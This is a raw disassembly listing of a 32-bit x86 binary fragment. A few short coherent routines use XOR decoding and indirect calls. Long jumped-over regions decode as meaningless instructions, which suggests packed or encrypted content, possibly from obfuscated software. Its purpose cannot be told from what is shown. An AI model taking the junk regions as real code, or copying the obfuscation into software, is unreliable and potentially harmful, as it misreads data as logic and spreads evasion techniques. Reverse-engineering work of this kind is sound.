  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	sar    BYTE PTR [ecx+ebp*4],1
  415961:	stos   BYTE PTR es:[edi],al
  415962:	ins    DWORD PTR es:[edi],dx
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x4159b1
  41596b:	xchg   esp,eax
  41596c:	lods   eax,DWORD PTR ds:[esi]
  41596d:	or     al,0x84
  41596f:	data16 cli 
  415971:	jae    0x415959
  415973:	fsubrp st(3),st
  415975:	jecxz  0x4158fc
  415977:	shl    edi,cl
  415979:	rcl    cl,1
  41597b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41597c:	test   eax,0x5527d213
  415981:	mov    al,ds:0x23d69805
  415986:	or     DWORD PTR [edi],edi
  415988:	aam    0x91
  41598a:	jo     0x415927
  41598c:	push   ss
  41598d:	dec    ecx
  41598e:	xchg   esi,eax
  41598f:	sub    BYTE PTR [edx+0x3120305a],ah
  415995:	aam    0xd7
  415997:	dec    ecx
  415998:	jne    0x415a03
  41599a:	sbb    edi,DWORD PTR [ebx-0x50668709]
  4159a0:	(bad)  [esi]
  4159a2:	pop    ebp
  4159a3:	xchg   ebp,eax
  4159a4:	loope  0x41599b
  4159a6:	xchg   edi,eax
  4159a7:	stos   BYTE PTR es:[edi],al
  4159a8:	inc    ebx
  4159a9:	ret    
  4159aa:	retf   0xc733
  4159ad:	cmp    eax,0xcc9e8aea
  4159b2:	ins    BYTE PTR es:[edi],dx
  4159b3:	stos   DWORD PTR es:[edi],eax
  4159b4:	and    eax,0xe39bc354
  4159b9:	test   DWORD PTR [esi+0x6ed3d2dd],esi
  4159bf:	lods   eax,DWORD PTR ds:[esi]
  4159c0:	call   0x1cf7885c
  4159c5:	stos   BYTE PTR es:[edi],al
  4159c6:	iret   
  4159c7:	sahf   
  4159c8:	cs (bad) 
  4159ca:	fwait
  4159cb:	jno    0x415977
  4159cd:	cmp    esi,edx
  4159cf:	mov    cl,0x25
  4159d1:	repz jle 0x415a08
  4159d4:	call   0xad0:0x9ab7d620
  4159db:	fdiv   DWORD PTR [ecx]
  4159dd:	leave  
  4159de:	pop    ebx
  4159df:	jge    0x415a24
  4159e1:	lods   al,BYTE PTR ds:[esi]
  4159e2:	and    esi,DWORD PTR [esi-0x71]
  4159e5:	cmp    ecx,ebx
  4159e7:	js     0x415989
  4159e9:	pop    esi
  4159ea:	mov    al,0x98
  4159ec:	fwait
  4159ed:	(bad)  
  4159ee:	inc    edx
  4159ef:	jbe    0x41598a
  4159f1:	mov    al,0xda
  4159f3:	xor    BYTE PTR [eax],dl
  4159f5:	xor    DWORD PTR [ecx+0x3b],0xffffffd9
  4159f9:	jmp    0x415a39
  4159fb:	ficomp DWORD PTR [esi]
  4159fd:	pushf  
  4159fe:	out    0xe4,al
  415a00:	jecxz  0x415987
  415a02:	add    esp,DWORD PTR [ebp+0x35]
  415a05:	jle    0x4159ca
  415a07:	and    BYTE PTR [eax],0x42
  415a0a:	sbb    BYTE PTR [edi+0x7f],al
  415a0d:	mov    cl,0xdd
  415a0f:	jl     0x4159e3
  415a11:	fisub  DWORD PTR [edx-0x3b7f48c2]
  415a17:	mov    ds:0x6d0ee48e,al
  415a1c:	or     edi,DWORD PTR [esi+edi*1+0x44f0bcca]
  415a23:	inc    esi
  415a24:	cli    
  415a25:	outs   dx,DWORD PTR ds:[esi]
  415a26:	push   ds
  415a27:	ins    DWORD PTR es:[edi],dx
  415a28:	sbb    ebp,edx
  415a2a:	pop    ds
  415a2b:	inc    esi
  415a2c:	jmp    0xab30407c
  415a31:	push   ecx
  415a32:	push   ds
  415a33:	mov    ds:0xba5920c7,al
  415a38:	loopne 0x415a2c
  415a3a:	mov    ebp,0xfc0e7f71
  415a3f:	push   es
  415a40:	mov    ch,0x50
  415a42:	dec    eax
  415a43:	xor    cl,BYTE PTR [ebx+0x738bd4d2]
  415a49:	push   eax
  415a4a:	in     al,0x49
  415a4c:	and    al,0x97
  415a4e:	dec    edx
  415a4f:	mov    dh,BYTE PTR ds:0xec34310d
  415a55:	fucomip st,st(6)
  415a57:	lahf   
  415a58:	daa    
  415a59:	fdivr  QWORD PTR [edi]
  415a5b:	mov    al,ds:0xe78ddae9
  415a60:	cdq    
  415a61:	mov    dh,0x1
  415a63:	out    0x94,eax
  415a65:	xchg   ecx,eax
  415a66:	rcl    DWORD PTR [edi+eiz*8],cl
  415a69:	mov    esi,0xa544b019
  415a6e:	xor    eax,0x59a5fb93
  415a73:	imul   ecx,DWORD PTR [ebx+0x14],0xc7a7bd59
  415a7a:	loope  0x415a8a
  415a7c:	adc    al,0xac
  415a7e:	cmp    al,BYTE PTR [ebx+0x6a]
  415a81:	jp     0x415a10
  415a83:	cmp    eax,0x86d7e11e
  415a88:	mov    ebp,0x2d09c32e
  415a8d:	iret   
  415a8e:	jg     0x415a1d
  415a90:	jge    0x415a4d
  415a92:	aas    
  415a93:	out    dx,al
  415a94:	leave  
  415a95:	jmp    0x415a92
  415a97:	or     esi,edi
  415a99:	test   BYTE PTR [edx],bh
  415a9b:	gs jmp 0x415abd
  415a9e:	popf   
  415a9f:	cli    
  415aa0:	call   0x4c9c29b7
  415aa5:	imul   ebp,DWORD PTR [edx+0x4f5f3862],0xffffffc8
  415aac:	pop    esi
  415aad:	pop    esp
  415aae:	mov    ds:0xbfc40b99,eax
  415ab3:	cmp    al,BYTE PTR [eax+0x27e6a2a1]
  415ab9:	pop    esi
  415aba:	xchg   ebx,eax
  415abb:	sub    al,0x36
  415abd:	icebp  
  415abe:	mov    eax,esi
  415ac0:	mov    dh,0x57
  415ac2:	dec    ebp
  415ac3:	fld    QWORD PTR [ebx+0x59]
  415ac6:	add    al,0xa5
  415ac8:	cmc    
  415ac9:	xchg   edi,eax
  415aca:	push   es
  415acb:	dec    ebp
  415acc:	data16 int 0xed
  415acf:	aad    0x2c
  415ad1:	int    0x3d
  415ad3:	or     dh,BYTE PTR [ebx+0x406b30e8]
  415ad9:	mov    esi,0xb70be452
  415ade:	adc    ah,BYTE PTR [edi+0x1f265ff1]
  415ae4:	test   DWORD PTR [bp+di],ebp
  415ae7:	mov    BYTE PTR [ecx+0x33],dl
  415aea:	jecxz  0x415b41
  415aec:	dec    ebp
  415aed:	das    
  415aee:	adc    eax,0x5449f501
  415af3:	aaa    
  415af4:	add    DWORD PTR [edx+0x10],ecx
  415af7:	jp     0x415b3b
  415af9:	popf   
  415afa:	jecxz  0x415b47
  415afc:	xchg   edx,eax
  415afd:	daa    
  415afe:	imul   esi,DWORD PTR [edi+0x26],0x7
  415b02:	cwde   
  415b03:	fdivr  QWORD PTR [eax]
  415b05:	dec    esp
  415b06:	jmp    0x11bc0957
  415b0b:	(bad)  
  415b0c:	mov    ebp,0x617ef261
  415b11:	xchg   edx,eax
  415b12:	mov    esp,0x7d65edb
  415b17:	loope  0x415ae7
  415b19:	pop    eax
  415b1a:	mov    ds:0x697706d9,al
  415b1f:	popf   
  415b20:	sti    
  415b21:	(bad)  
  415b22:	ja     0x415aa9
  415b24:	jecxz  0x415b9d
  415b26:	and    DWORD PTR [edi-0x64c48141],esp
  415b2c:	(bad)  
  415b2d:	push   ebp
  415b2e:	call   0x63ff1ec
  415b33:	fcomp  DWORD PTR [ebx+0x2200076d]
  415b39:	adc    BYTE PTR [edx],0x23
  415b3c:	add    eax,0x90e4ecf4
  415b41:	arpl   WORD PTR [ebp+ecx*4+0xb29cfaf],ax
  415b48:	mov    cl,cl
  415b4a:	push   esp
  415b4b:	loope  0x415b7f
  415b4d:	mov    ah,0xb7
  415b4f:	jns    0x415b10
  415b51:	popf   
  415b52:	xchg   edi,eax
  415b53:	ins    DWORD PTR es:[edi],dx
  415b54:	lock enter 0xd7b5,0xa0
  415b59:	xchg   edx,eax
  415b5a:	add    eax,0x7f285daf
  415b5f:	dec    ecx
  415b60:	sbb    DWORD PTR [eax-0x4e],edx
  415b63:	cmc    
  415b64:	jg     0x415b1f
  415b66:	repz add ah,cl
  415b69:	lahf   
  415b6a:	jne    0x415bc8
  415b6c:	mov    ebx,0x50fc00f0
  415b71:	add    DWORD PTR [edx+0x13],0x73
  415b75:	xchg   ebp,eax
  415b76:	in     eax,0x4d
  415b78:	stos   DWORD PTR es:[edi],eax
  415b79:	xchg   esi,eax
  415b7a:	xchg   edi,eax
  415b7b:	mov    ah,0x4f
  415b7d:	or     DWORD PTR [edi+0x52f8a35a],ebx
  415b83:	sbb    eax,0x9dbfee97
  415b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b89:	cs aaa 
  415b8b:	mov    ebp,0xdc0a1d59
  415b90:	add    al,0x83
  415b92:	mov    ah,0x0
  415b94:	jl     0x415b6c
  415b96:	loopne 0x415b94
  415b98:	cdq    
  415b99:	add    eax,0xa0667934
  415b9e:	inc    ebx
  415b9f:	dec    eax
  415ba0:	ins    BYTE PTR es:[edi],dx
  415ba1:	ins    DWORD PTR es:[edi],dx
  415ba2:	(bad)  
  415ba4:	fcomp  QWORD PTR [ecx+0x579e79dc]
  415baa:	outs   dx,BYTE PTR ds:[esi]
  415bab:	push   esp
  415bac:	lock pop ss
  415bae:	ficomp WORD PTR [ebx]
  415bb0:	mov    dh,0x18
  415bb2:	gs xor cl,ch
  415bb5:	add    edi,ebx
  415bb7:	rcl    DWORD PTR [edi],0xfe
  415bba:	imul   esp,DWORD PTR [ebx],0xffffff93
  415bbd:	ror    BYTE PTR [esi-0x6696709],1
  415bc3:	mov    dh,0x3f
  415bc5:	(bad)  
  415bc6:	xor    al,bl
  415bc8:	pop    ss
  415bc9:	xor    ecx,DWORD PTR [edi]
  415bcb:	lea    ebx,[esp+esi*4+0x60]
  415bcf:	pop    ecx
  415bd0:	mov    ch,0x36
  415bd2:	and    esp,eax
  415bd4:	sbb    ebp,DWORD PTR ds:0xb8932441
  415bda:	icebp  
  415bdb:	push   ecx
  415bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdd:	dec    ebp
  415bde:	out    dx,al
  415bdf:	lods   eax,DWORD PTR ds:[esi]
  415be0:	(bad)  
  415be1:	jg     0x415b69
  415be3:	mov    ecx,0x93e557f
  415be8:	fist   DWORD PTR [edx+0x7c]
  415beb:	mov    eax,ds:0xa4f4f85b
  415bf0:	sub    eax,0x360a085c
  415bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf6:	sub    al,0xd2
  415bf8:	xchg   esi,eax
  415bf9:	scas   eax,DWORD PTR es:[edi]
  415bfa:	ftst   
  415bfc:	loopne 0x415b86
  415bfe:	pop    ebp
  415bff:	ret    
  415c00:	or     dh,ah
  415c02:	outs   dx,BYTE PTR ds:[esi]
  415c03:	xchg   ebp,eax
  415c04:	mov    ebx,0x5c75151
  415c09:	cmc    
  415c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c0b:	inc    edx
  415c0c:	add    BYTE PTR [eax],dl
  415c0e:	adc    BYTE PTR [eax],al
  415c10:	add    BYTE PTR [eax-0x7637ac7],bh
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	dec    ecx
  415c40:	stos   BYTE PTR es:[edi],al
  415c41:	or     BYTE PTR ds:[edx-0x6a8780eb],0x7e
  415c49:	js     0x415cc3
  415c4b:	jbe    0x415c67
  415c4d:	mov    dl,0x40
  415c4f:	fdiv   QWORD PTR [ebp+ecx*4-0x77]
  415c53:	xor    BYTE PTR [esi],bl
  415c55:	mov    ah,0xa8
  415c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c58:	imul   edx,ebp,0xffffffc1
  415c5b:	jp     0x415ca1
  415c5d:	inc    esp
  415c5e:	jb     0x415bec
  415c60:	mov    ss,WORD PTR [eax-0x5d]
  415c63:	in     al,0x84
  415c65:	xor    esi,DWORD PTR [edi+0x70bd15f1]
  415c6b:	inc    ecx
  415c6c:	loope  0x415bfe
  415c6e:	jb     0x415c7a
  415c70:	shr    BYTE PTR gs:[esi],0x40
  415c74:	mov    ds:0x686ba414,eax
  415c79:	int3   
  415c7a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  415c7c:	stos   BYTE PTR es:[edi],al
  415c7d:	repnz les esp,FWORD PTR [ebp+0x6dedbe8a]
  415c84:	ss iret 
  415c86:	retf   
  415c87:	in     al,dx
  415c88:	xchg   esp,eax
  415c89:	xor    DWORD PTR [ebx-0x5e],ebp
  415c8c:	mov    ah,0xba
  415c8e:	daa    
  415c8f:	xlat   BYTE PTR ds:[ebx]
  415c90:	push   ebp
  415c91:	(bad)  [eax]
  415c93:	mov    dh,0xe5
  415c95:	sub    eax,0xde032f4b
  415c9a:	dec    ebx
  415c9b:	int    0x47
  415c9d:	ja     0x415ce4
  415c9f:	jb     0x415cca
  415ca1:	aam    0xb0
  415ca3:	mov    ebp,0xc1706bad
  415ca8:	rcl    esp,cl
  415caa:	loopne 0x415c77
  415cac:	pop    ds
  415cad:	push   es
  415cae:	dec    ebx
  415caf:	sub    edi,ecx
  415cb1:	(bad)  
  415cb2:	push   0xcb7e869c
  415cb7:	mov    dh,0x93
  415cb9:	or     esi,DWORD PTR [edx+0x29a8af2f]
  415cbf:	xor    al,0x4b
  415cc1:	cli    
  415cc2:	(bad)  
  415cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cc4:	ret    
  415cc5:	mov    esp,0x18945d36
  415cca:	mov    esp,cs
  415ccc:	or     dh,BYTE PTR [ebx]
  415cce:	sbb    eax,0x8f14aa42
  415cd3:	xchg   ebx,eax
  415cd4:	xor    ebp,DWORD PTR [ecx]
  415cd6:	lahf   
  415cd7:	enter  0xd3f4,0x1e
  415cdb:	adc    DWORD PTR [ebx],ebp
  415cdd:	push   ecx
  415cde:	fsub   DWORD PTR ds:0xa3937e2e
  415ce4:	mov    dh,0x4e
  415ce6:	xor    ecx,DWORD PTR [eax+0x71]
  415ce9:	sub    DWORD PTR [ecx],ebx
  415ceb:	jns    0x415cb9
  415ced:	xor    eax,ebx
  415cef:	mov    bh,BYTE PTR ss:[eax]
  415cf2:	ret    
  415cf3:	cmp    cl,bh
  415cf5:	mov    DWORD PTR [eax-0x20ecbcd9],ebx
  415cfb:	fs fs xchg ebx,eax
  415cfe:	loop   0x415cb3
  415d00:	ret    0x4c03
  415d03:	std    
  415d04:	jg     0x415d3a
  415d06:	loop   0x415d0b
  415d08:	fstp   TBYTE PTR ds:0xdadb8fd2
  415d0e:	jae    0x415d02
  415d10:	or     DWORD PTR [edi+0x1b],0x4cdbd740
  415d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d18:	(bad)  
  415d19:	mov    edi,0xf641d8b5
  415d1e:	daa    
  415d1f:	dec    esp
  415d20:	popa   
  415d21:	adc    BYTE PTR [ebp+0x35],bh
  415d24:	out    dx,al
  415d25:	retf   
  415d26:	mov    WORD PTR [edi],?
  415d28:	ret    0x959e
  415d2b:	push   ebx
  415d2c:	lahf   
  415d2d:	cmp    DWORD PTR [ecx+0x534528eb],0xb41da1d4
  415d37:	in     al,dx
  415d38:	sbb    al,cl
  415d3a:	inc    ecx
  415d3b:	pop    eax
  415d3c:	jmp    0x4ecf1629
  415d41:	dec    ebx
  415d42:	mov    cl,0x50
  415d44:	adc    DWORD PTR [edx+0x60],esp
  415d47:	ds ss push ebx
  415d4a:	cld    
  415d4b:	aas    
  415d4c:	in     eax,dx
  415d4d:	adc    al,0x28
  415d4f:	adc    eax,0x4aedba35
  415d54:	sub    DWORD PTR [edx+eiz*8],esp
  415d57:	mov    ch,0x89
  415d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d5a:	or     ecx,ecx
  415d5c:	fldenv ds:0x9c712a0f
  415d62:	xor    eax,DWORD PTR [ebp-0x576c1499]
  415d68:	mov    esi,0x516215fb
  415d6d:	pop    ecx
  415d6e:	loope  0x415dca
  415d70:	sub    eax,0x1d017e33
  415d75:	ins    DWORD PTR es:[edi],dx
  415d76:	xor    bh,BYTE PTR [ebp-0xe1c327]
  415d7c:	cli    
  415d7d:	sub    eax,0xee266f20
  415d82:	std    
  415d83:	xor    eax,0x48daddca
  415d88:	sbb    BYTE PTR [ebx],ch
  415d8a:	fisubr WORD PTR [ebp+0x17]
  415d8d:	jecxz  0x415e01
  415d8f:	jle    0x415dbf
  415d91:	jmp    0x415dd6
  415d93:	ret    0x4555
  415d96:	pop    eax
  415d97:	sar    DWORD PTR [edx],cl
  415d99:	scas   al,BYTE PTR es:[edi]
  415d9a:	pop    esi
  415d9b:	mov    esp,esi
  415d9d:	jne    0x415dcd
  415d9f:	nop
  415da0:	mov    bh,0xfd
  415da2:	cmc    
  415da3:	sbb    cl,BYTE PTR [ebx+0x3c]
  415da6:	fwait
  415da7:	mov    ah,0x15
  415da9:	sbb    BYTE PTR [eax-0x2e0044a],cl
  415daf:	adc    ecx,eax
  415db1:	out    dx,al
  415db2:	retf   0x285d
  415db5:	daa    
  415db6:	out    dx,al
  415db7:	into   
  415db8:	fs mov ecx,0xc136951a
  415dbe:	nop
  415dbf:	mov    ebp,0xf22eadac
  415dc4:	retf   
  415dc5:	adc    al,0xa4
  415dc7:	xchg   ebp,eax
  415dc8:	aad    0xf8
  415dca:	mov    ebp,DWORD PTR [ecx-0xfe798f7]
  415dd0:	and    BYTE PTR [ebx+0x6a],0xd0
  415dd4:	in     eax,0x59
  415dd6:	mov    ah,BYTE PTR [ecx-0x33]
  415dd9:	pop    ecx
  415dda:	xlat   BYTE PTR ds:[ebx]
  415ddb:	inc    edx
  415ddc:	sub    BYTE PTR [edx],dl
  415dde:	test   al,0x96
  415de0:	ins    DWORD PTR es:[edi],dx
  415de1:	xchg   ecx,eax
  415de2:	cwde   
  415de3:	dec    ebp
  415de4:	imul   esi,DWORD PTR [eax-0x533ad200],0xf
  415deb:	mov    esi,0x9e397611
  415df0:	and    eax,0x17d37768
  415df5:	jle    0x415e1c
  415df7:	sub    esp,esi
  415df9:	push   ss
  415dfa:	nop
  415dfb:	xor    DWORD PTR [ecx-0x2c752692],ebx
  415e01:	outs   dx,BYTE PTR ds:[si]
  415e03:	inc    ecx
  415e04:	fwait
  415e05:	cmp    bl,dh
  415e07:	push   esi
  415e08:	or     ecx,DWORD PTR [esp+ebp*1+0x45]
  415e0c:	icebp  
  415e0d:	rol    DWORD PTR [edx+eiz*1-0x27],1
  415e11:	xlat   BYTE PTR ds:[ebx]
  415e12:	xor    edx,DWORD PTR [edi+edi*2-0x71ffd751]
  415e19:	daa    
  415e1a:	inc    esp
  415e1b:	inc    edi
  415e1c:	(bad)  
  415e1d:	and    BYTE PTR [edx-0x40],dl
  415e20:	xlat   BYTE PTR ds:[ebx]
  415e21:	xchg   ecx,eax
  415e22:	sbb    DWORD PTR [edi+ecx*4-0x52],ebp
  415e26:	dec    esi
  415e27:	stos   DWORD PTR es:[edi],eax
  415e28:	ins    DWORD PTR es:[edi],dx
  415e29:	push   cs
  415e2a:	jno    0x415e8e
  415e2c:	jecxz  0x415e51
  415e2e:	inc    ebx
  415e2f:	adc    eax,0x228346c8
  415e34:	lahf   
  415e35:	(bad)  [ecx+0x318144ea]
  415e3b:	stc    
  415e3c:	lods   eax,DWORD PTR ds:[esi]
  415e3d:	push   edi
  415e3e:	jecxz  0x415e95
  415e40:	push   edi
  415e41:	mov    dl,0xbf
  415e43:	pop    eax
  415e44:	adc    BYTE PTR [edx],al
  415e46:	jnp    0x415e6e
  415e48:	push   eax
  415e49:	push   eax
  415e4a:	inc    eax
  415e4b:	clc    
  415e4c:	mov    ds:0xbee82bd6,al
  415e51:	and    dh,cl
  415e53:	iret   
  415e54:	es loopne 0x415ddd
  415e57:	push   esi
  415e58:	add    dl,BYTE PTR [ebp+0x3]
  415e5b:	add    esp,eax
  415e5d:	fcomp  QWORD PTR ds:0xdd70cc05
  415e63:	retf   
  415e64:	xor    al,0x13
  415e66:	mov    esp,0x995ef207
  415e6b:	xor    BYTE PTR [ecx],0x31
  415e6e:	xlat   BYTE PTR ds:[ebx]
  415e6f:	mov    edi,0xb18e0ca5
  415e74:	popf   
  415e75:	(bad)
  415e79:	push   eax
  415e7a:	jecxz  0x415ec9
  415e7c:	int    0xbd
  415e7e:	mov    ebx,0x782ba9ff
  415e83:	add    BYTE PTR [ebx-0x1b],ch
  415e86:	pop    eax
  415e87:	stos   DWORD PTR es:[edi],eax
  415e88:	inc    eax
  415e8a:	mov    DWORD PTR [ecx-0xa],ecx
  415e8d:	outs   dx,BYTE PTR ds:[esi]
  415e8e:	xchg   BYTE PTR [ebp-0x80],bh
  415e91:	dec    esi
  415e92:	push   ebp
  415e93:	jbe    0x415e53
  415e95:	push   ebx
  415e96:	dec    ebx
  415e97:	cmp    ebp,0xfb8f6363
  415e9d:	mov    al,0x1f
  415e9f:	out    dx,eax
  415ea0:	mov    ?,ecx
  415ea2:	inc    edi
  415ea3:	dec    edi
  415ea4:	or     bh,BYTE PTR [ebx]
  415ea6:	mov    al,0x91
  415ea8:	ds xchg ecx,eax
  415eaa:	les    esi,FWORD PTR [ebx-0xd4b8b74]
  415eb0:	cli    
  415eb1:	inc    ebx
  415eb2:	push   es
  415eb3:	push   0xc5df6e09
  415eb8:	xchg   BYTE PTR [eax-0x2a],bh
  415ebb:	adc    esp,eax
  415ebd:	popa   
  415ebe:	dec    edx
  415ebf:	xchg   edi,eax
  415ec0:	in     al,dx
  415ec1:	jb     0x415f04
  415ec3:	cmp    al,0xb9
  415ec5:	(bad)  
  415ec6:	rcl    BYTE PTR [edx-0x77ff9848],cl
  415ecc:	mov    ah,0x25
  415ece:	jecxz  0x415e5f
  415ed0:	cld    
  415ed1:	mov    al,0x41
  415ed3:	dec    ecx
  415ed4:	mov    edx,0x31509916
  415ed9:	into   
  415eda:	xor    DWORD PTR [ebx],ebx
  415edc:	or     BYTE PTR [ebx-0x15],0xcd
  415ee0:	rcr    DWORD PTR [edx+0x31777e9c],0x89
  415ee7:	inc    ebp
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	adc    esp,0xffffffe5
  415f4d:	fisub  WORD PTR [edi]
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415fbe
  415f57:	in     al,dx
  415f58:	icebp  
  415f59:	cdq    
  415f5a:	cmp    eax,0x3b40b86d
  415f5f:	fimul  WORD PTR [esi+0x69622259]
  415f65:	jns    0x415f36
  415f67:	push   ebp
  415f68:	push   eax
  415f69:	mov    ebp,0xd49fd933
  415f6e:	cmp    al,0x2d
  415f70:	jmp    0x8148e80
  415f75:	jl     0x415f0c
  415f77:	loop   0x415fa6
  415f79:	mov    ecx,0xbc7fd437
  415f7e:	and    al,0xe3
  415f80:	call   DWORD PTR [ecx-0xd]
  415f83:	loop   0x415fed
  415f85:	cmc    
  415f86:	and    BYTE PTR [ebx-0x25dfb67b],0x96
  415f8d:	loop   0x415f4a
  415f8f:	ds pop ds
  415f91:	out    0x98,al
  415f93:	fild   DWORD PTR [ebx]
  415f95:	jmp    0xa3fe:0xfd2bd846
  415f9c:	push   edi
  415f9d:	hlt    
  415f9e:	call   0xe576:0xfec0e758
  415fa5:	and    DWORD PTR [esi+0x2b216478],eax
  415fab:	pop    esp
  415fac:	xor    al,0x77
  415fae:	or     ebp,DWORD PTR [edi-0x23]
  415fb1:	sbb    esi,esp
  415fb3:	call   0x5908519e
  415fb8:	rcr    BYTE PTR [ecx+ecx*2+0x33],cl
  415fbc:	and    eax,0xda094b78
  415fc1:	sti    
  415fc2:	mov    cl,0x41
  415fc4:	(bad)  
  415fc5:	sbb    DWORD PTR [ebx-0x38acbd49],edx
  415fcb:	arpl   WORD PTR [edi+0x50cd747b],dx
  415fd1:	jo     0x415f85
  415fd3:	aas    
  415fd4:	mov    edx,0x4de3506c
  415fd9:	mov    eax,DWORD PTR [edi]
  415fdb:	mov    esp,0x913375dd
  415fe0:	fimul  DWORD PTR [esi-0x10]
  415fe3:	mov    dl,0x99
  415fe5:	fs mov bh,0x86
  415fe8:	test   al,0xc5
  415fea:	(bad)  
  415feb:	aad    0x1f
  415fed:	mov    bh,0xaa
  415fef:	(bad)  
  415ff0:	rcl    DWORD PTR [eax-0x6584c87d],cl
  415ff6:	xor    al,0x41
  415ff8:	adc    ch,bl
  415ffa:	pop    ss
  415ffb:	ds jo  0x415ff6
  415ffe:	addr16 add edi,eax
  416001:	mov    cl,0x8d
  416003:	stc    
  416004:	popf   
  416005:	push   0x1ef1eda7
  41600a:	(bad)  
  41600b:	xchg   edx,eax
  41600c:	mov    esp,0xdc351880
  416011:	jno    0x415fe2
  416013:	les    esp,FWORD PTR ds:0x9a0e9bc8
  416019:	mov    bh,0xa3
  41601b:	int3   
